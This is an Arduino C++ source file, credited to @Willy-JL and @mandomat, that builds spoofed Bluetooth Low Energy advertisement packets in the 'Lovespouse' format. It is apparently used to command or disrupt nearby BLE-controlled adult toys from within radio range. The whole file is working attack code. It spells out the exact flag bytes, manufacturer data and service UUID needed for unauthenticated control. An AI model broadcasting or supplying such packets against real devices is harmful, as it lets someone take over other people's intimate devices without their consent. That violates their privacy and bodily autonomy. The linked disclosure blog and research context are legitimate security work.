#include <Arduino.h>

#include "lovespouse.hpp"

// Hacked together by @Willy-JL
// Discovered by @mandomat
// Blog post at https://mandomat.github.io/2023-11-13-denial-of-pleasure/

uint8_t* make_lovespouse_packet(LovespouseMode status) {

    uint32_t mode;
    mode = status.value;

    uint8_t size = 22;
    uint8_t* packet = (uint8_t*)malloc(size);
    uint8_t i = 0;

    packet[i++] = 2; // Size
    packet[i++] = 0x01; // AD Type (Flags)
    packet[i++] = 0x1A; // Flags

    packet[i++] = 14; // Size
    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
    packet[i++] = 0xFF; // Company ID (Typo Products, LLC)
    packet[i++] = 0x00; // ...
    packet[i++] = 0x6D;
    packet[i++] = 0xB6;
    packet[i++] = 0x43;
    packet[i++] = 0xCE;
    packet[i++] = 0x97;
    packet[i++] = 0xFE;
    packet[i++] = 0x42;
    packet[i++] = 0x7C;
    packet[i++] = (mode >> 0x10) & 0xFF;
    packet[i++] = (mode >> 0x08) & 0xFF;
    packet[i++] = (mode >> 0x00) & 0xFF;

    packet[i++] = 3; // Size
    packet[i++] = 0x03; // AD Type (Service UUID List)
    packet[i++] = 0x8F; // Service UUID (Unregistered)
    packet[i++] = 0xAE; // ...

    return packet;
}
